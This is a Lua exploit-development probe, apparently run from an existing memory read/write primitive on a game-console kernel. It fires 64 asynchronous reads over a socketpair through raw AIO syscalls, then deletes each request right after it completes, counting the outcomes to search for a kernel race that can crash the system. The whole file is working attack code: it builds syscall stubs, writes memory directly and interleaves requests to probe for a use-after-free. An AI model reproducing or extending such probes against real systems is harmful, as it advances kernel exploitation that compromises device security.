-- CRASH_CLASS: HIGH
-- PROBE 974b: pair each completion with its delete — send one read's data, delete that id
--
-- 974a showed every delete stays 0x80020010 while the reads are still pending, so the
-- interesting interleaving is completion-then-delete on the *same* object. This sends
-- exactly one chunk and deletes exactly that id, 64 times, and counts the outcomes.

print("=== PROBE 974b: AIO COMPLETION/DELETE PAIRING ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function show(tag, ok, rv) if not ok then print("  ["..tag.."] PCALL-FAIL") return end local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X",tag,h,l)) end

local pid = to_num(mk(20)())
print(string.format("[A] pid=%u", pid))
local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
show("socketpair", pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end))
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("  fds = %d, %d", fd0, fd1))
if fd0 <= 0 then print("no socketpair"); return end

local N = 64
local reqs = memory.alloc(0x28*N)
local ids  = memory.alloc(8*N)
local st   = memory.alloc(8*N)
local buf  = memory.alloc(0x100*N)
for i=0,0x28*N-1,4 do wd(reqs+i,0) end
for i=0,N-1 do
    local r = reqs + i*0x28
    local ba = addr_of(buf) + i*0x100
    wd(r+0x08, 0x100)
    wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
    wd(r+0x20, fd0)
end
print(string.format("[B] submit %d one-byte-buffer reads", N))
show("submit", pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end))

local msg = memory.alloc(0x100)
for i=0,0xFF,4 do wd(msg+i, 0x42420000 + i) end
local msgp = addr_of(msg)
local one = memory.alloc(8)
local eo  = memory.alloc(8)

local freed, busy, other = 0, 0, 0
local firstfree = -1
for i=0,N-1 do
    local ok = pcall(function() return mk(133)(uint64(fd1),uint64(msgp),uint64(0x100),uint64(0x80)) end)
    if not ok then break end
    wd(one, rd(ids+i*4))
    local ok2, rv = pcall(function() return mk(662)(uint64(one),uint64(1),uint64(eo)) end)
    if ok2 then
        local h,l = hi_lo(rv)
        local e = rd(eo)
        if l == 0 and e == 0 then freed = freed + 1 if firstfree < 0 then firstfree = i end
        elseif e == 0x80020010 then busy = busy + 1
        else other = other + 1 end
    else other = other + 1 end
    if (i+1) % 16 == 0 then
        pcall(function() return mk(664)(uint64(ids),uint64(N),uint64(st)) end)
        print(string.format("  [%d] freed=%d busy=%d other=%d st0=%d", i+1, freed, busy, other, rd(st)))
    end
end

print("[C] poll then delete again the first eight")
pcall(function() return mk(664)(uint64(ids),uint64(N),uint64(st)) end)
for i=0,7 do
    wd(one, rd(ids+i*4))
    local ok2, rv = pcall(function() return mk(662)(uint64(one),uint64(1),uint64(eo)) end)
    local h,l = hi_lo(ok2 and rv or 0)
    print(string.format("    [%d] ret=%d err=0x%08X st=%d", i, to_num(rv), rd(eo), rd(st+i*4)))
end

print(string.format("[Z] freed=%d busy=%d other=%d firstfree=%d alive=%d", freed, busy, other, firstfree, to_num(mk(20)())))
print("=== COMPLETE ===")
